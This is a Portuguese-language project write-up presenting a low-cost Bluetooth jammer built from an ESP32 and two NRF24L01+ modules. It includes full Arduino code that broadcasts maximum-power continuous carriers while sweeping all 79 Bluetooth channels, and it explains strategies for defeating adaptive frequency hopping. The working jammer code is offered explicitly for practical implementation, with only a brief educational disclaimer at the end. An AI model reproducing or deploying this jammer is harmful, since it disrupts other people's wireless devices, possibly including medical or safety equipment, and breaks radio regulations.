
# Estudo - Interrompendo Comunicações Bluetooth Utilizando um Dispositivo de Baixo Custo

---

## **Introdução**

O protocolo Bluetooth, amplamente utilizado para comunicação sem fio em dispositivos móveis e IoT, é projetado para operar em um ambiente ruidoso com mecanismos como salto de frequência e correção de erros. Apesar dessas características, é possível interromper ou degradar significativamente a comunicação Bluetooth utilizando um dispositivo de baixo custo, como um **ESP32** e módulos **NRF24L01**. Este estudo explora a construção de um jammer Bluetooth, sua implementação prática e estratégias para maximizar sua eficácia.

---

## **Objetivos**

1. Demonstrar a viabilidade de interromper comunicações Bluetooth utilizando dispositivos de baixo custo.
2. Explorar estratégias para maximizar a eficácia contra sistemas adaptativos.
3. Apresentar um código funcional para implementação prática.

---

## **Materiais Necessários**

- 1x ESP32 (com LED azul para indicação de status).
- 2x Módulos NRF24L01+ com antena externa (para maior alcance).
- Fios jumper e protoboard.
- Software Arduino IDE (com bibliotecas RF24 instaladas).

---

## **Configuração e Teoria**

O Bluetooth opera na faixa de **2.4 GHz** a **2.480 GHz**, dividida em **79 canais de 1 MHz**. Dispositivos Bluetooth utilizam **salto de frequência** para alternar entre canais até **1.600 vezes por segundo**, minimizando interferências.

### **Estratégias Aplicadas**
1. **Sinal Portadora Contínua**:
   - Utiliza o método `startConstCarrier()` para gerar um sinal constante em cada canal, saturando-o.

2. **Saltos de Canal Aleatórios**:
   - Implementação de saltos imprevisíveis para cobrir toda a faixa Bluetooth, dificultando a recuperação de dispositivos adaptativos.

3. **Divisão de Faixa**:
   - Dois rádios NRF24L01 são usados simultaneamente, cobrindo metade dos canais cada, garantindo cobertura rápida.

---

## **Implementação**

### **Código Fonte**

```cpp
#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"

// Configurações de SPI para dois rádios
SPIClass *sp = nullptr;
SPIClass *hp = nullptr;

RF24 radio(16, 15, 16000000);   // HSPI
RF24 radio1(22, 21, 16000000);  // VSPI

// Configurações de canais e controle
int ch_hspi = 0;  // Canal inicial para HSPI
int ch_vspi = 40; // Canal inicial para VSPI
bool flag_hspi = false;  // Direção do HSPI
bool flag_vspi = true;   // Direção do VSPI

// Pino do LED azul e indicador de erro
const int ledPin = 2;
bool hasError = false;

// Função de configuração inicial
void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW); // Inicialmente o LED fica apagado
  Serial.begin(115200);

  // Desativa Wi-Fi e Bluetooth do ESP32
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();

  // Inicializa os rádios
  if (!initHP() || !initSP()) {
    hasError = true; // Marca erro se um rádio não inicializar
  }
}

// Inicialização do rádio no barramento VSPI
bool initSP() {
  sp = new SPIClass(VSPI);
  sp->begin();
  if (radio1.begin(sp)) {
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.startConstCarrier(RF24_PA_MAX, ch_vspi); // Portadora contínua
    return true;
  } else {
    Serial.println("Erro ao inicializar VSPI");
    return false;
  }
}

// Inicialização do rádio no barramento HSPI
bool initHP() {
  hp = new SPIClass(HSPI);
  hp->begin();
  if (radio.begin(hp)) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, ch_hspi); // Portadora contínua
    return true;
  } else {
    Serial.println("Erro ao inicializar HSPI");
    return false;
  }
}

// Lógica para alternar canais e maximizar a interferência
void jammerSweepBluetooth() {
  // Atualiza o canal do HSPI
  if (flag_hspi) {
    ch_hspi -= random(1, 3); // Decremento aleatório
    if (ch_hspi < 0) {
      ch_hspi = random(1, 5);
      flag_hspi = false;
    }
  } else {
    ch_hspi += random(1, 3); // Incremento aleatório
    if (ch_hspi > 39) {
      ch_hspi = 39;
      flag_hspi = true;
    }
  }
  radio.setChannel(ch_hspi);

  // Atualiza o canal do VSPI
  if (flag_vspi) {
    ch_vspi -= random(2, 5); // Decremento aleatório
    if (ch_vspi < 40) {
      ch_vspi = 40;
      flag_vspi = false;
    }
  } else {
    ch_vspi += random(2, 5); // Incremento aleatório
    if (ch_vspi > 78) {
      ch_vspi = 78;
      flag_vspi = true;
    }
  }
  radio1.setChannel(ch_vspi);
}

// Indica erro piscando o LED
void indicateError() {
  digitalWrite(ledPin, HIGH);
  delay(500);
  digitalWrite(ledPin, LOW);
  delay(500);
}

// Loop principal
void loop() {
  if (hasError) {
    indicateError(); // Pisca LED em caso de erro
  } else {
    digitalWrite(ledPin, HIGH); // LED ligado para operação normal
    jammerSweepBluetooth();     // Lógica de interferência
  }
}
```

---

## **Resultados Esperados**

1. **Interferência Contínua**:
   - Comunicação Bluetooth em dispositivos próximos será degradada ou interrompida.

2. **Eficiência Contra Sistemas Adaptativos**:
   - A lógica de saltos aleatórios e portadora contínua dificulta a recuperação de dispositivos adaptativos.

3. **Cobertura Completa**:
   - Todos os canais Bluetooth (0-78) são cobertos rapidamente por dois rádios operando simultaneamente.

---

## **Conclusão**

Este estudo demonstrou a eficácia de dispositivos de baixo custo, como ESP32 e NRF24L01, para interromper comunicações Bluetooth. A combinação de saltos aleatórios, portadora contínua e lógica otimizada garantiu interferência significativa, mesmo contra sistemas adaptativos. No entanto, deve-se ressaltar que o uso de jammers é **estritamente regulado** e deve ser realizado apenas em ambientes controlados e autorizados.

---

## **Referências**

1. NORDIC SEMICONDUCTOR. **nRF24L01 Product Specification**. Disponível em: <https://infocenter.nordicsemi.com/pdf/nRF24L01P_PS_v1.0.pdf>. Acesso em: 23 dez. 2024.

2. BLUETOOTH SPECIAL INTEREST GROUP. **Bluetooth Core Specification 5.3**. Disponível em: <https://www.bluetooth.com/specifications/bluetooth-core-specification/>. Acesso em: 23 dez. 2024.

3. FCC. **Jammer Enforcement Policy**. Disponível em: <https://www.fcc.gov/general/jammer-enforcement>. Acesso em: 23 dez. 2024.

4. ANATEL. **Resolução nº 680/2017**. Disponível em: <https://www.gov.br/anatel/pt-br>. Acesso em: 23 dez. 2024.

5. BALAKRISHNAN, H.; PADMANABHAN, V. N. **Interference-Aware Wireless Networks**. Disponível em: <https://dl.acm.org/doi/10.1145/383059.383071>. Acesso em: 23 dez. 2024.

6. TMRH20. **RF24 Library Documentation**. Disponível em: <https://tmrh20.github.io/RF24/>. Acesso em: 23 dez. 2024.

---

**Nota**: Este projeto tem finalidade exclusivamente educacional. Usar um jammer em redes públicas pode ser ilegal e sujeito a penalidades.
